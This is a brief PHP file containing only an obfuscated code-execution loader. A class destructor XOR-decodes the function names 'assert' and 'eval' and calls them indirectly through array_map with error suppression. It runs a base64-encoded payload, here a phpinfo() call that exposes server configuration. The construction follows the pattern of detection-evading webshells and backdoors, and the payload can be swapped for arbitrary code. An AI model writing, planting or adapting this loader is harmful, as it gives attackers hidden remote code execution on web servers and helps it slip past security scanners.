<?php
class TDYH{
    function __destruct(){
        $this->AYPT(']+BDMh'^"\x3c\x58\x31\x21\x3f\x1c",array(('zeC]'^"\x1f\x13\x22\x31")."(base64_decode('cGhwaW5mbygpOw=='));"));
        }
    function AYPT($OVTE,$RNPH){
        @array_map($OVTE,$RNPH);
    }}
$tdyh=new TDYH();
?>